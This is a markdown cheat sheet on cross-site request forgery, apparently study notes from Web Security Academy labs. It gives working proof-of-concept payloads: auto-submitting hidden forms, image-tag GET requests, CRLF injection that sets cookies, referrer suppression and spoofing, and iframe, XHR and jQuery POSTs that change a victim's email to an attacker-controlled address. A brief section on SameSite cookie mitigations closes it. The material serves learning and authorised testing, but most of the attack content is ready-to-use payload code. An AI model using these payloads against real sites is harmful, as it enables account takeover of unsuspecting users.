# CSRF
## Scenarios
### No Defense
```html
<form method="POST" action="https://ac741ff11f938fe1801459c7009e0090.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="test@myemail.com">
</form>
<script>
document.forms[0].submit();
</script>
```

***

### CSRF where token validation depends on request method
#### Test
- Change request method
#### POC
```html
<img src="https://ac9a1f8f1e76e13f80360e0e009400d7.web-security-academy.net/my-account/change-email?email=test%40myemail.com">
```

***

### CSRF where token validation depends on token being present
#### Test
- Remove token from request and see if it passes
#### POC
```html
<form method="POST" action="https://ac741ff11f938fe1801459c7009e0090.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="test@myemail.com">
</form>
<script>
document.forms[0].submit();
</script>
```

***

### CSRF where token is not tied to user session
#### Test
- Get a fresh csrf token from the update email page via inspecting the source
- Open a private/incognito browser window, log in to your other account, and intercept the update request
- replace the csrf token with the one captured earlier
#### POC
```html
<form method="POST" action="https://ac001fe61f576f3b808b0f7100fd0037.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test@myemail.com">
    <input type="hidden" name="csrf" value="KdhHWIn09SrZyjySlgfaHCS9TzXB0iss">  
    </form>
    <script>
    document.forms[0].submit();
    </script>
```

***

### CSRF where token is tied to non-session cookie
#### Test
- changing the session cookie logs you out, but changing the csrfKey cookie merely results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session. 
- Observe that if you swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted.
- search for endpoints that gets reflected in the Set-Cookie header
- use CRLF injection to inject new cookie
#### POC
```html
<form method="POST" action="https://aca51fb61ff988aa803fa9cd003f0079.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test@myemail.com">
    <input type="hidden" name="csrf" value="xe5r3sdRe2Ceizmo4blfpy02UKxpN03k">  
    </form>
    <img src="https://aca51fb61ff988aa803fa9cd003f0079.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=jGDyLoTZDIE2A47Chp2F9MjrjDNHdnHI" onerror="document.forms[0].submit()"> 
```

*** 

### CSRF where token is duplicated in cookie
#### Test
- Check if csrf token is validated against cookie
- Search for a point where cookie value gets reflected
#### POC
```html
<form method="POST" action="https://ac951f4f1e9fceda80912065008000ac.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="sasdasdasd@myemail.com">
    <input type="hidden" name="csrf" value="fake">  
    </form>
    <img src="https://ac951f4f1e9fceda80912065008000ac.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()"> 
```

***

### CSRF where Referer validation depends on header being present
#### Test
- Check if the referer header is checked and used as CSRF mitigation
#### POC
```html
<meta name="referrer" content="no-referrer"> 
<form method="POST" action="https://ac081f091ee034ef802e1dbd00d60000.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="sasdasdasd@myemail.com">
</form>
<script>
       document.forms[0].submit();
</script>
```

***

### CSRF with broken Referer validation
#### Test 
- Does the website seems to accept any Referer header as long as it contains the expected domain somewhere in the string?
#### POC
```html
<form method="POST" action="https://acc21f351e145baf809bc06c00b30072.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="sasdasdasd@myemail.com">
    </form>
<script>
    history.pushState("", "", "/?acc21f351e145baf809bc06c00b30072.web-security-academy.net");
       document.forms[0].submit();
</script>
```

#### CSRF with Unverified Anti-CSRF Token
Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side. This may seem unlikely, but it has occurred!
```html
<form action="change.php" >
<input type="hidden" name="anti_csrf" value="bgoDZVGis4bdsh672388293OrttIvgV">
<input type="hidden" name="old" value="myC00Lemail@victim.site">
<input type="email" name="new" placeholder="your new email" required>
<input type="submit" value="Confirm">
</form>
```

#### Bruteforcable CSRF tokens
Some applications generates anti-CSRF tokens with an extremely poor level of randomness, therefore, requiring only a few attempts to brute force the mechanism


## Payloads
### GET Requests
#### No interaction needed to trigger
via HTML tags
```html
<iframe src=URL>
<script src=URL />
<input type="image" src=URL alt="">
<embed src=URL>
<audio src=URL>
<video src=URL>
<source src=URL >
<video poster=URL>
<link rel="stylesheet" href=URL>
<object data=URL>
<body background=URL>
<div style="background:url(URL)">
<style>body { background:url(URL) } </style>
 
```

via HTML tags dynamically created by Javascript
```js
function MakeGET(tokenID) {
var url = "http://victim.site/csrf/brute/change.php?";
url += "old=myoldemail&confirm=1&";
url += "new=attackerEmail&csrfToken=" + tokenID;
new Image().src = url; //GET Request
}
```

### POST Requests
#### Auto-submitting Form
Via Hidden IFrames
```html
<iframe style="display:none" name="CSRFrame"></iframe>
<form action="change.php" method="POST" id="CSRForm" target="CSRFrame">
<input name="old" value="myC00Lemail@victim.site">
<input name="new" value="evil@hacker.site">
</form>
<script>document.getElementById("CSRForm").submit()</script>
```

or XHR requests
```js
var url = "URL";
var params = "old=mycoolemail@victim.site&new=evil@hacker.site";
var CSRF = new XMLHttpRequest();
CSRF.open("POST", url, false);
CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
CSRF.send(params);
```

or via JQuery
```js
$.ajax({
type: "POST",
url: "URL",
data: "old=mycoolemail@victim.site&new=evil@hacker.site",
});
```
***

## Mitigations
### Same Site Cookie
- The **`SameSite`** attribute of the [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) HTTP response header allows you to declare if your cookie should be restricted to a [first-party](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#third-party_cookies) or same-site context.
- A cookie is associated with a domain. If this domain is the same as the domain of the page you are on, the cookie is called a _first-party cookie_. If the domain is different, it is a _third-party cookie_.
-  the server hosting a web page sets first-party cookies, the page may contain images or other components stored on servers in other domains (for example, ad banners), which may set third-party cookies
-  These are mainly used for advertising and tracking across the web.

### Types
- Lax: When you set a cookie' SameSite attribute to Lax, the cookie will be sent along with the GET request initiated by third party website.
	- Resources can be loaded by iframe, img tags, and script tags. These requests can also operate as GET requests, but none of them cause TOP LEVEL navigation. Basically, they don't change the URL in your address bar. Because these GET requests do not cause a TOP LEVEL navigation, thus cookies set to Lax won't be sent with them.
- Strict: Cookies will only be sent in a first-party context and not be sent along with requests initiated by third party websites.
- None: Cookies will be sent in all contexts